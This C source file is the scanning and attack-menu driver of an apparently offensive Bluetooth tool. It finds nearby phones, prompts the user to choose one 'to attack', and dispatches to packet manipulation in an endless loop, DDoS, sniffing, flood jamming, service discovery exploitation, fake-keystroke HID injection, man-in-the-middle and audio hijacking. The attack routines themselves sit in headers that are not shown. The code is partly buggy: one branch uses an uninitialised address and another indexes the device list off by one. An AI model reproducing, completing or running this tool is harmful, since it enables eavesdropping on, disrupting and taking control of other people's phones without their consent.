#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>
#include "sniff.h"
#include "jam.h"
#include "hid.h"
#include "mitm.h"
#include "sdp.h"
#include "a.h"
#ifdef __cplusplus
extern "C" {
#endif
void cpp_modify_packets(const bdaddr_t* target_addr, const char* payload);
void cpp_ddos_attack(const bdaddr_t* target_addr, int duration_sec);
#ifdef __cplusplus
}
#endif

void scan_devices(bdaddr_t *target_addr) {
    inquiry_info *devices = NULL;
    int max_rsp = 255;
    int num_rsp, i;
    char addr[19] = {0};
    char name[248] = {0};
    int dev_id = hci_get_route(NULL);
    int sock = hci_open_dev(dev_id);

    if (dev_id < 0 || sock < 0) {
        perror("Failed to open Bluetooth socket");
        exit(1);
    }

    devices = (inquiry_info *)malloc(max_rsp * sizeof(inquiry_info));
    if (!devices) {
        perror("Failed to allocate memory");
        close(sock);
        exit(1);
    }

    num_rsp = hci_inquiry(dev_id, 8, max_rsp, NULL, &devices, IREQ_CACHE_FLUSH);
    if (num_rsp < 0) {
        perror("Failed to perform Bluetooth scan");
        free(devices);
        close(sock);
        exit(1);
    }

    printf("Scanning for Bluetooth phones...\n");
    int phone_count = 0;

    for (i = 0; i < num_rsp; i++) {
        ba2str(&(devices + i)->bdaddr, addr);
        memset(name, 0, sizeof(name));

        if (hci_read_remote_name(sock, &(devices + i)->bdaddr, sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        uint32_t cod = (devices + i)->dev_class[2] << 16 |
                       (devices + i)->dev_class[1] << 8  |
                       (devices + i)->dev_class[0];
        if ((cod & 0xFF0000) == 0x5A0000) {
            printf("%d: %s %s [Phone Detected]\n", phone_count + 1, addr, name);
            phone_count++;
        }
    }

    if (phone_count == 0) {
        printf("No Bluetooth phones found.\n");
        free(devices);
        close(sock);
        return;
    }

    int choice;
    printf("Enter the number of the phone to attack: \n");
    scanf("%d", &choice);

    if (choice < 1 || choice > phone_count) {
        printf("Invalid choice.\n");
        free(devices);
        close(sock);
        exit(1);
    }

    int attack;
    printf("Select Attack:\n");
    printf("  1. Manipulate Packet \n");
    printf("  2. DDoS Attack \n");
    printf("  3. Sniff Bluetooth Packets \n");
    printf("  4. Jamming \n");
    printf("  5. Service Discovery Attack \n");
    printf("  6. HID Injection Attack (Keyboard/Mouse) \n");
    printf("  7. Service Discovery Attack\n");
    printf("  8. MITM Attack\n");
    printf("  9. Aduio Attack\n");
    printf("Select a number between 1 and 9: \n");
    scanf("%d", &attack);

    if (attack == 1) {
        char msg[1024];
        printf("Enter Payload: \n");
        scanf("%1023s", msg);
        while(1){
            cpp_modify_packets(&(devices + choice - 1)->bdaddr, msg);
        }
    } else if (attack == 2) {
        int duration;
        printf("Duration of The Attack (Seconds): \n");
        scanf("%d", &duration);
        cpp_ddos_attack(&(devices + choice - 1)->bdaddr, duration);
    } else if (attack == 3) {
        start_sniffing();
    } else if (attack == 4) {
        int jam;
        printf("Select Jamming Mode:\n");
        printf("  1. L2CAP Flood\n");
        printf("  2. RFCOMM Flood\n");
        scanf("%d", &jam);
        jam_device(&(devices + choice - 1)->bdaddr, jam);
    } else if (attack == 5) {
        char target_addr[18];
        ba2str(&(devices + choice - 1)->bdaddr, target_addr);
        scan_and_exploit(target_addr);
    } else if (attack == 6) {
        printf("HID Attack: Sending Fake Keystrokes...\n");
        char target_addr[14];
        bdaddr_t target_bdaddr;
        str2ba(target_addr, &target_bdaddr);
        perform_hid_attack(&target_bdaddr);
    }else if(attack == 7){
        char target_addr[18];
        ba2str(&(devices + choice - 1)->bdaddr, target_addr);
        scan_and_exploit(target_addr);
    }else if(attack == 8){
        start_mitm_attack(&(devices + choice -1)->bdaddr);
    }else if(attack == 9){
        char target_mac[19] = {0};
        ba2str(&(devices[choice].bdaddr), target_mac);
        hijack_a2dp(target_mac);
    }
    bacpy(target_addr, &(devices + choice - 1)->bdaddr);
    free(devices);
    close(sock);
}
